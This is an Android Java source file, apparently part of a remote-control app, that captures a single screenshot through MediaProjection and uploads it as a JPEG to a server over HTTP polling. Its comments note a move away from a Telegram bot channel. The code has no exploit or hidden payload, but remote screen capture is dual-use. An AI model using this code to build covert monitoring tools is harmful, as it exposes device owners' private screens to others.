package com.remotecontrol;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

/**
 * ScreenCapture
 *
 * Захват экрана через MediaProjection (Android 12+).
 * После захвата отправляет JPEG на сервер через HttpPollingEngine.uploadScreenshot().
 * Никаких ссылок на Telegram, chatId или TelegramEngine.
 */
public class ScreenCapture {

    private static final String TAG = "ScreenCapture";

    private static MediaProjection activeProjection;
    private static VirtualDisplay   virtualDisplay;
    private static ImageReader      imageReader;

    // ──────────────────────────────────────────────────
    //  Init / Release
    // ──────────────────────────────────────────────────

    /**
     * Сохраняет MediaProjection. Вызывается из ScreenCaptureService.onStartCommand().
     */
    public static void initProjection(MediaProjection projection, Context context) {
        activeProjection = projection;
        Log.i(TAG, "MediaProjection initialized");

        if (projection != null) {
            projection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.w(TAG, "MediaProjection stopped externally");
                    release();
                }
            }, null);
        }
    }

    /**
     * Освобождает все ресурсы. Вызывается из ScreenCaptureService.onDestroy().
     */
    public static void release() {
        releaseDisplayResources();
        if (activeProjection != null) {
            try { activeProjection.stop(); } catch (Exception ignored) {}
            activeProjection = null;
        }
        Log.i(TAG, "ScreenCapture released");
    }

    // ──────────────────────────────────────────────────
    //  Capture entry point
    // ──────────────────────────────────────────────────

    /**
     * Делает скриншот и загружает его на сервер через HttpPollingEngine.
     * Вызывается из ScreenCaptureService после получения MediaProjection.
     *
     * @param context контекст
     * @param engine  HttpPollingEngine для загрузки файла
     */
    public static void captureAndUpload(Context context, HttpPollingEngine engine) {
        if (activeProjection == null) {
            Log.e(TAG, "captureAndUpload: projection is null");
            return;
        }

        // Получаем размеры экрана
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.view.WindowMetrics wMetrics = wm.getCurrentWindowMetrics();
            metrics.widthPixels  = wMetrics.getBounds().width();
            metrics.heightPixels = wMetrics.getBounds().height();
            metrics.densityDpi   = context.getResources().getDisplayMetrics().densityDpi;
        } else {
            wm.getDefaultDisplay().getRealMetrics(metrics);
        }

        int width   = metrics.widthPixels;
        int height  = metrics.heightPixels;
        int density = metrics.densityDpi;

        Log.d(TAG, "Capturing: " + width + "x" + height);

        // Сбрасываем предыдущие ресурсы
        releaseDisplayResources();

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

        virtualDisplay = activeProjection.createVirtualDisplay(
                "RCCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, null
        );

        imageReader.setOnImageAvailableListener(reader -> {
            // Убираем listener сразу — нам нужен один кадр
            reader.setOnImageAvailableListener(null, null);

            Image image = null;
            Bitmap bitmap = null;
            try {
                // Небольшая пауза для стабилизации кадра
                Thread.sleep(300);

                image = reader.acquireLatestImage();
                if (image == null) {
                    Log.w(TAG, "acquireLatestImage returned null");
                    return;
                }

                bitmap = imageToBitmap(image, width, height);
                File file = bitmapToJpeg(context, bitmap, 80);

                if (file != null && engine != null) {
                    // Загружаем в фоновом потоке (listener уже в не-UI потоке)
                    engine.uploadScreenshot(file);
                }

            } catch (Exception e) {
                Log.e(TAG, "Capture error: " + e.getMessage());
            } finally {
                if (image  != null) image.close();
                if (bitmap != null) bitmap.recycle();
                releaseDisplayResources();
            }
        }, null);
    }

    // ──────────────────────────────────────────────────
    //  Bitmap helpers
    // ──────────────────────────────────────────────────

    private static Bitmap imageToBitmap(Image image, int width, int height) {
        Image.Plane[] planes    = image.getPlanes();
        ByteBuffer    buffer    = planes[0].getBuffer();
        int pixelStride         = planes[0].getPixelStride();
        int rowStride           = planes[0].getRowStride();
        int rowPadding          = rowStride - pixelStride * width;

        Bitmap bmp = Bitmap.createBitmap(
                width + rowPadding / pixelStride,
                height,
                Bitmap.Config.ARGB_8888
        );
        bmp.copyPixelsFromBuffer(buffer);

        // Обрезаем padding справа если есть
        if (rowPadding != 0) {
            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
            bmp.recycle();
            return cropped;
        }
        return bmp;
    }

    private static File bitmapToJpeg(Context context, Bitmap bitmap, int quality) {
        File file = new File(context.getCacheDir(),
                "sc_" + System.currentTimeMillis() + ".jpg");
        try (FileOutputStream fos = new FileOutputStream(file)) {
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, fos);
            fos.flush();
            Log.d(TAG, "JPEG saved: " + file.length() / 1024 + " KB → " + file.getName());
            return file;
        } catch (IOException e) {
            Log.e(TAG, "bitmapToJpeg error: " + e.getMessage());
            return null;
        }
    }

    // ──────────────────────────────────────────────────
    //  Cleanup
    // ──────────────────────────────────────────────────

    private static void releaseDisplayResources() {
        if (virtualDisplay != null) {
            try { virtualDisplay.release(); } catch (Exception ignored) {}
            virtualDisplay = null;
        }
        if (imageReader != null) {
            try { imageReader.close(); } catch (Exception ignored) {}
            imageReader = null;
        }
    }
}
